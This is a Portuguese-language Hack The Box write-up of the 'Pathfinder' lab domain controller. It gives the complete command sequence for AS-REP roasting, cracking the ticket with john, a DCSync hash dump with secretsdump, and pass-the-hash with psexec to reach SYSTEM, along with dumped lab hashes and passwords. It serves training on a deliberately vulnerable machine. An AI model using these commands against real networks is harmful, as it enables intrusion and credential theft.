---
title: HTB Pathfinder Writeup
author: Hastur
date: 2021-09-06 22:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Starting point, Windows, Very Easy, AD, Análise Gráfica, Kerberos]
image: /img/htb/htb-pathfinder-logo.png
alt: "HTB Pathfinder Writeup"
---

<img src="/img/htb/htb-pathfinder-logo.png">

<br>


| Nome | Pathfinder  |
|------|-------------|
|IP    | 10.10.10.30 |
|Pontos| 0           |
|OS    | Windows     |
|Nível | Very Easy   |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.30 --min-rate=512
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-08 04:15:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC

```
Encontramos várias portas abertas nesta máquina, percebemos que temos o LDAP na porta 389 e o Kerberos na porta 88.
Também temos o WinRM na porta 5985, estas informações indicam que estamos lidando com um Domain Controller.

### Active Directory

Desta vez, precisaremos fazer uma análise gráfica do AD, para tanto, vamos precisar de algumas ferramentas.
A primeira delas é o injester `bloodhound` do python que pode ser instalado através do comando `pip install bloodhound`.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ pip install bloodhound
Collecting bloodhound
  Downloading bloodhound-1.1.1-py3-none-any.whl (65 kB)
     |████████████████████████████████| 65 kB 2.4 MB/s 
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from bloodhound) (0.18.2)
Requirement already satisfied: pyasn1>=0.4 in /usr/lib/python3/dist-packages (from bloodhound) (0.4.8)
Requirement already satisfied: impacket>=0.9.17 in /usr/lib/python3/dist-packages (from bloodhound) (0.9.22)
Requirement already satisfied: dnspython in /usr/lib/python3/dist-packages (from bloodhound) (2.0.0)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from bloodhound) (2.8.1)
Installing collected packages: bloodhound
  WARNING: The script bloodhound-python is installed in '/home/hastur/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
Successfully installed bloodhound-1.1.1
```

Como já temos as credenciais `sandra:Password1234!` obitadas na máquina anterior ([Shield](https://hastur666.github.io/posts/htb-shield-writeup/)), vamos tentar obter informações do AD.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ python3 -m bloodhound -d megacorp.local -u sandra -p 'Password1234!' -gc pathfinder.megacorp.local -c all -ns 10.10.10.30                                                                                                          130 ⨯
INFO: Found AD domain: megacorp.local
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 5 users
INFO: Connecting to GC LDAP server: pathfinder.megacorp.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Pathfinder.MEGACORP.LOCAL
INFO: Done in 00M 39S
```
A autenticação aconteceu com sucesso, e o bloodhound salvou alguns arquivos `.json` com as informações do AD em nosso diretório de trabalho.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ ls -la
total 116
drwxr-xr-x  2 hastur hastur  4096 Sep  7 18:12 .
drwxr-xr-x 31 hastur hastur  4096 Sep  7 17:58 ..
-rw-r--r--  1 hastur hastur  3370 Sep  7 18:12 20210907181146_computers.json
-rw-r--r--  1 hastur hastur  3243 Sep  7 18:12 20210907181146_domains.json
-rw-r--r--  1 hastur hastur 85362 Sep  7 18:12 20210907181146_groups.json
-rw-r--r--  1 hastur hastur 12521 Sep  7 18:12 20210907181146_users.json
```
Para conseguirmos de fato analisar estas informações, precisaremos de mais duas aplicações: o `neo4j` e o `bloodhound` que podem ser instalados com o comando `sudo apt install neo4j bloodhound`.

### Preparando o ambiente

Antes de iniciarmos, precisamos configurar o ambiente com o neo4j e bloodhount.
Primeiro vamos iniciar o neo4j `sudo neo4j console`.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ sudo neo4j console
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
2021-09-07 22:20:53.094+0000 INFO  Starting...
2021-09-07 22:20:54.732+0000 INFO  ======== Neo4j 4.2.1 ========
2021-09-07 22:20:56.115+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2021-09-07 22:20:56.122+0000 INFO  Setting up initial user from defaults: neo4j
2021-09-07 22:20:56.122+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2021-09-07 22:20:56.129+0000 INFO  Setting version for 'security-users' to 2
2021-09-07 22:20:56.132+0000 INFO  After initialization of system graph model component 'security-users' have version 2 and status CURRENT
2021-09-07 22:20:56.136+0000 INFO  Performing postInitialization step for component 'security-users' with version 2 and status CURRENT
2021-09-07 22:20:56.350+0000 INFO  Bolt enabled on localhost:7687.
2021-09-07 22:20:57.116+0000 INFO  Remote interface available at http://localhost:7474/
2021-09-07 22:20:57.116+0000 INFO  Started.
```
Ele irá abrir na porta 7474 que pode ser acessado pelo browser.


<img src="/img/htb/htb-pathfinder-1.png">

As credenciais iniciais para utilizá-lo, são `neo4j:neo4j`. Logo no primeiro acesso, ele pedirá para trocar a senha de acesso.

Agora precisamos iniciar o bloodhound com o comando `bloodhound --no-sandbox`.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ bloodhound --no-sandbox
(node:2824) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

<img src="/img/htb/htb-pathfinder-2.png">

Ele irá solicitar as credenciais do `neo4j`.

Para facilitar a importação dos dados, podemos compactar todos os arquivos .jsob que obtivemos e, em seguida, arrastar o arquivo .zip para dentro do bloodhound.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ zip pathfinder.zip *.json
  adding: 20210907181146_computers.json (deflated 74%)
  adding: 20210907181146_domains.json (deflated 85%)
  adding: 20210907181146_groups.json (deflated 95%)
  adding: 20210907181146_users.json (deflated 91%)
```

Após a importação, temos várias querys que podemos fazer, mas utilizaremos duas.
Em `Analysis`, primeiro clicamos em `Shortest Paths to High value Targets` e depois em `Find Principles with DCSync Rights`.

<img src="/img/htb/htb-pathfinder-3.png">

Este mapa nos mostra a distância que cada usuário tem do Domain Controller e seus respectivos privilégios.

<img src="/img/htb/htb-pathfinder-4.png">

Podemos ver que o usuário `svc_bes` se liga diretamente ao DC e tem privilégios `GetChangesAll`. Isso significa que este usuário tem privilégios de solicitar informações sensíveis do DC, inclusive hashes de senhas.

### Escalação de privilégios horizontal

Podemos fazer uma tentativa de PrivEsc Horizontal, ao tentar acesso com o usuário `svc_bes`, para tanto, precisamos checar se a pré-autenticação do Kerberos está desabilitada para esta conta. Se sim, o DC está vulnerável a [ASREPRoasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).

Vamos utilizar o `GetNPUsers.py` para verificar.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774
```
Conseguimos um `TGT ticket` para o usuário svc_bes!!!

Vamos salvar este ticket no arquivo `hash` e tentar quebrá-lo com o `john`.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ echo '$krb5asrep$23$svc_bes@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774' > hash
                                                                                                                                                                                                                                             
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)
1g 0:00:00:05 DONE (2021-09-07 18:44) 0.1754g/s 1860Kp/s 1860Kc/s 1860KC/s Sherbear94..Shanelee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
E conseguimos as credenciais `svc_bes:Sheffield19`.

Podemos utilizar o `evil-winrm` para acesso reoto. Ele pode ser instalado com o comando `sudo gem install evil-winrm`.

<img src="/img/htb/htb-pathfinder-5.png">

E conseguimos o shell!!
A flag `user.txt` se encontra no Desktop do usuário.

### Escalação de privilégios vertical

Como nosso usuário tem permissões `GetChangesAll`, podemos utilizar o `secretsdump.py` para conseguir a hash do administrador do DC.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30                                                                                                  126 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:7e2b4bffb0d54e17b7528cb122bae602:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
Administrator:des-cbc-md5:f1c89e75a42cd0fb
krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
krbtgt:des-cbc-md5:d0f8d0c86ee9d997
svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
svc_bes:des-cbc-md5:1cc16e37ef8940b5
sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
sandra:des-cbc-md5:23988f7a9d679d37
PATHFINDER$:aes256-cts-hmac-sha1-96:9e07592ae55cfd43c84e85a477854c8e3f40c70630ea24bebdeda66a15e77e18
PATHFINDER$:aes128-cts-hmac-sha1-96:4de068761918fa0005de10f361b49703
PATHFINDER$:des-cbc-md5:6d37cd7904b6f7f2
[*] Cleaning up... 
```

Com a hash do administrador, podemos utilizar a técnica de `Pass The Hash` (PTH), onde conseguimos nos autenticar no host não com a senha, mas com a hash do usuário. Para isso podemos utilizar o `psexec.py`.

```bash
┌──(hastur㉿hastur)-[~/Pathfinder]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.30.....
[*] Found writable share ADMIN$
[*] Uploading file vpCRwyDb.exe
[*] Opening SVCManager on 10.10.10.30.....
[*] Creating service btXJ on 10.10.10.30.....
[*] Starting service btXJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

<img src="/img/htb/htb-pathfinder-6.png">

E conseguimos shell como administrador!!!
A flag `root.txt` se encontra no Desktop do Administrator.

<br>

E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">


